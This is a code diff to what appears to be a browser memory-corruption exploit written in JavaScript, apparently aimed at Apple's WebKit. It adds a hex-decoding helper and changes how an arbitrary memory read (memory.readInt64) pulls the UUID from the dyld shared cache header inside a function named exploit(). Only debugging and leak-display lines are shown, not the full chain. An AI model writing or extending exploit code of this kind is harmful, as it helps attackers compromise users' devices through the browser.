@@ -21,6 +21,13 @@ let fail = function fail(x)
         location.reload();
         throw null;
     }
+function ha (hex) {
+    var string = '';
+    for (var i = 0; i < hex.length; i += 2) {
+      string += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
+    }
+    return string;
+}
 function sleep(seconds){
     var waitUntil = new Date().getTime() + seconds*1000;
     while(new Date().getTime() < waitUntil) true;
@@ -581,8 +588,8 @@ function exploit(){
         }
 
         alert('dyld cache header @' + hdr);
-        var uuid = memory.readInt64(Add(hdr, 0x58)).lo();
-        alert("uuid: " + uuid)
+        var uuid = memory.readInt64(Add(hdr, 0x58));
+        alert("uuid: " + ha(uuid))
         //var dcachedump = String.fromCharCode(...memory.copyfrom(hdr,0,100))
         
         function ab2str(buf) {
